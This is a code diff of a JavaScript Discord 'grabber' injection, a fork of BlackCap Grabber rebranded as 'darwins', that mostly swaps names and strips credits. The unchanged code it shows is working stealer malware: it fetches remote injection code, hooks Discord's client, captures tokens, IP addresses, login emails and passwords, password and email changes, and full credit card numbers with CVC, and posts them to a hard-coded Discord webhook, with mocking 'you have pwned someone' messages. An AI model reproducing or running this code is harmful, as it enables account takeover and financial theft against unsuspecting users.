@@ -29,7 +29,6 @@ const config = {
 
     injection_url: "https://raw.githubusercontent.com/darwinikii/darwins/main/index.js",
     webhook: "https://discord.com/api/webhooks/805180096570065006/wRZ96UzvMpauozS5obrWhzxdLHrXSMramAHHTXAEtSUdUj3hbeF6EiI8zNf_x8QWvM85",
-    UWUWED: "https://login.blackcap-grabber.com:3000/premium/",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -128,7 +127,7 @@ if (fs.existsSync(bdPath)) require(bdPath);`;
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
     }, 5000);
     }
-    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
+    if (!fs.existsSync(path.join(__dirname, "darwins"))) return !0;
     execScript(
         `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
     );
@@ -205,7 +204,6 @@ const hooker = async (content) => {
     req.end();
 };
 
-
 async function post(url, embed){
     const window = BrowserWindow.getAllWindows()[0];
     console.log(url + embed)
@@ -263,18 +261,18 @@ async function FirstTime() {
     window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {
 
         if (config['init-notify'] == "true") {
-            if (fs.existsSync(path.join(__dirname, "blackcap"))) {
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+            if (fs.existsSync(path.join(__dirname, "darwins"))) {
+                fs.rmdirSync(path.join(__dirname, "darwins"));
                 if (token == null || token == undefined || token == "") {
                     var {
                         ip
                     } = await getIP()
                     const c = {
-                        username: "BlackCap Grabber",
+                        username: "darwins Grabber",
                         avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
+                            title: "darwins Initalized",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -282,15 +280,11 @@ async function FirstTime() {
                                 inline: !1
 							}],
                             author: {
-                                name: "BlackCap"
-                            },
-                            footer: {
-                                text: "©KSCH | https://github.com/KSCHdsc"
+                                name: "darwins"
                             }
 						}]
                     };
                     let data = JSON.stringify(c);
-                    let UwU = JSON.stringify({ data: data, token: token })
                     hooker(c)
 
                 } else {
@@ -306,12 +300,12 @@ async function FirstTime() {
                         bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "BlackCap Grabber",
+                        username: "darwins Grabber",
                         avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                         content: "",
                         embeds: [{
-                            title: "BlackCap Initalized",
-                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                            title: "darwins Initalized",
+                            description: "<a:blackcapgif:1041634542093619260>  **Oh you have pwned someone**",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -342,18 +336,11 @@ async function FirstTime() {
                                 value: `${GetA2F(b.mfa_enabled)}`,
                                 inline: !0
 								}, {
-                                name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                                inline: !0
-								}, {
                                 name: "<a:tokens:1041634540537511957> Token",
                                 value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                 inline: !1
 								}],
 
-                            footer: {
-                                text: "©KSCH | https://github.com/KSCHdsc"
-                            },
                             image: {
                                 url: bannerurl,
                             },
@@ -364,19 +351,17 @@ async function FirstTime() {
                     };
 
                     let data = JSON.stringify(c);
-                    let UwU = JSON.stringify({ data: data, token: token })
-                    //post(config.UWUWED, UwU);
                     hooker(c)
                 };
 
 
 
 
-                if (!fs.existsSync(path.join(__dirname, "blackcap"))) {
+                if (!fs.existsSync(path.join(__dirname, "darwins"))) {
                     return !0
                 }
 
-                fs.rmdirSync(path.join(__dirname, "blackcap"));
+                fs.rmdirSync(path.join(__dirname, "darwins"));
                 if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                     if (config['logout-notify'] == "true") {
                         if (token == null || token == undefined || token == "") {
@@ -384,29 +369,21 @@ async function FirstTime() {
                                 ip
                             } = await getIP()
                             const c = {
-                                username: "BlackCap Grabber",
+                                username: "darwins Grabber",
                                 avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCaped User log out (User not Logged in before)",
+                                    title: "pwned User log out (User not Logged in before)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
                                         value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                                         inline: !1
-							}],
-                                    author: {
-                                        name: "BlackCap"
-                                    },
-                                    footer: {
-                                        text: "©KSCH | https://github.com/KSCHdsc"
-                                    }
+							}]
 						}]
                             };
                             
                             let data = JSON.stringify(c);
-                            let UwU = JSON.stringify({ data: data, token: token })
-                            //post(config.UWUWED, UwU);
                             hooker(c)
 
                         } else {
@@ -421,12 +398,12 @@ async function FirstTime() {
                                 bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
-                                username: "BlackCap Grabber",
+                                username: "darwins Grabber",
                                 avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                                 content: "",
                                 embeds: [{
-                                    title: "BlackCap Victim got logged out",
-                                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                                    title: "pwned Victim got logged out",
+                                    description: "<a:blackcapgif:1041634542093619260>  **Oh you have pwned someone**",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -453,18 +430,11 @@ async function FirstTime() {
                                         value: `${GetA2F(b.mfa_enabled)}`,
                                         inline: !0
 								}, {
-                                        name: "@Copyright",
-                                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                                        inline: !0
-								}, {
                                         name: "<a:tokens:1041634540537511957> Token",
                                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                         inline: !1
 								}],
 
-                                    footer: {
-                                        text: "©KSCH | https://github.com/KSCHdsc"
-                                    },
                                     image: {
                                         url: bannerurl,
                                     },
@@ -474,8 +444,6 @@ async function FirstTime() {
 							}]
                             };
                             let data = JSON.stringify(c);
-                            let UwU = JSON.stringify({ data: data, token: token })
-                            //post(config.UWUWED, UwU);
                             hooker(c)
                             
                         }
@@ -848,12 +816,12 @@ async function Login(email, password, token) {
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
-                username: "BlackCap Grabber",
+                username: "darwins Grabber",
                 avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                 content: "",
                 embeds: [{
-                    "title": "BlackCap User Login",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    "title": "darwins User Login",
+                    description: "<a:blackcapgif:1041634542093619260>  **Oh you have pwned someone**",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -888,10 +856,6 @@ async function Login(email, password, token) {
                         value: `${GetA2F(info.mfa_enabled)}`,
                         inline: !0
 												}, {
-                        name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                        inline: !0
-												}, {
                         name: "Billing <a:billing:1041641103629234196>",
                         value: `${Cool()}`,
                         inline: !1
@@ -909,9 +873,6 @@ async function Login(email, password, token) {
                         inline: !1
 												}, ],
 
-                    "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
-                    },
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
@@ -920,9 +881,6 @@ async function Login(email, password, token) {
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
-                    "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
-                    },
                     "image": {
                         'url': `${bannerurl}`,
                     },
@@ -933,8 +891,6 @@ async function Login(email, password, token) {
             }
             
             let data = JSON.stringify(params);
-            let UwU = JSON.stringify({ data: data, token: token })
-            //post(config.UWUWED, UwU);
             hooker(params)
         })
     })
@@ -1009,12 +965,12 @@ async function ChangePassword(oldpassword, newpassword, token) {
             }
             let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
             const params = {
-                username: "BlackCap Grabber",
+                username: "darwins Grabber",
                 avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                 content: "",
                 embeds: [{
-                    "title": "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    "title": "darwins Detect Password Changed",
+                    description: "<a:blackcapgif:1041634542093619260>  **Oh you have pwned someone**",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -1049,10 +1005,6 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         value: `${GetA2F(info.mfa_enabled)}`,
                         inline: !0
 												}, {
-                        name: "@Copyright",
-                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                        inline: !0
-												}, {
                         name: "Billing <a:billing:1041641103629234196>",
                         value: `${Cool()}`,
                         inline: !1
@@ -1074,9 +1026,6 @@ async function ChangePassword(oldpassword, newpassword, token) {
                         inline: !1
 												}, ],
 
-                    "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
-                    },
                     "thumbnail": {
                         "url": `${usericonurl}`
                     }
@@ -1085,9 +1034,6 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     "color": config['embed-color'],
                     "description": CalcFriends(),
 
-                    "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
-                    },
                     "image": {
                         'url': `${bannerurl}`,
                     },
@@ -1178,12 +1124,12 @@ async function ChangeEmail(newemail, password, token) {
 
             
            const params = {
-                username: "BlackCap Grabber",
+                username: "darwins Grabber",
                 avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                 content: "",
                 embeds: [{
-                        "title": "BlackCap Detect Email Changed",
-                        description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                        "title": "darwins Detect Email Changed",
+                        description: "<a:blackcapgif:1041634542093619260>  **Oh you have pwned someone**",
                         "color": config['embed-color'],
                         "fields": [{
                                 name: "Injection Info",
@@ -1218,10 +1164,6 @@ async function ChangeEmail(newemail, password, token) {
                                 value: `${GetA2F(info.mfa_enabled)}`,
                                 inline: !0
 					}, {
-                                name: "@Copyright",
-                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
-                                inline: !0
-					}, {
                                 name: "Billing <a:billing:1041641103629234196>",
                                 value: `${Cool()}`,
                                 inline: !1
@@ -1240,9 +1182,6 @@ async function ChangeEmail(newemail, password, token) {
 					},
 				],
 
-                        "footer": {
-                            "text": "©KSCH | https://github.com/KSCHdsc"
-                        },
                         "thumbnail": {
                             "url": `${usericonurl}`
                         }
@@ -1251,9 +1190,6 @@ async function ChangeEmail(newemail, password, token) {
                         "color": config['embed-color'],
                         "description": CalcFriends(),
 
-                        "footer": {
-                            "text": "©KSCH | https://github.com/KSCHdsc"
-                        },
                         "image": {
                             'url': `${bannerurl}`,
                         },
@@ -1265,8 +1201,6 @@ async function ChangeEmail(newemail, password, token) {
 		]
             }
             let data = JSON.stringify(params);
-            let UwU = JSON.stringify({ data: data, token: token })
-            //post(config.UWUWED, UwU);
             hooker(params)
         })
     })
@@ -1289,11 +1223,11 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
 
         
         const params = {
-            username: "BlackCap Grabber",
+            username: "darwins Grabber",
             avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
             content: "",
             embeds: [{
-                    "title": "BlackCap User Credit Card Added",
+                    "title": "darwins User Credit Card Added",
                     "description": `
                     **IP:** ${ip}\n\n
                     **Username** <:username:1041634536733290596>\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
@@ -1308,12 +1242,6 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
                     **CVC**\n\`\`\`${cvc}\`\`\`\n
                     <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
-                    "author": {
-                        "name": "BlackCap"
-                    },
-                    "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
-                    },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
                     },
@@ -1321,11 +1249,8 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                 {
                     "title": `<a:totalfriends:1041641100017946685> Guilds Owner`,
                     "color": config['embed-color'],
-                    "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
+                    "description": `\`\`\`diff\n${fs.readFileSync('pwned_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
 
-                    "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
-                    },
                     "image": {
                         'url': `${bannerurl}`,
                     },
@@ -1336,8 +1261,6 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ]
         }
         let data = JSON.stringify(params);
-        let UwU = JSON.stringify({ data: data, token: token })
-        //post(config.UWUWED, UwU);
         hooker(params)
 }
 
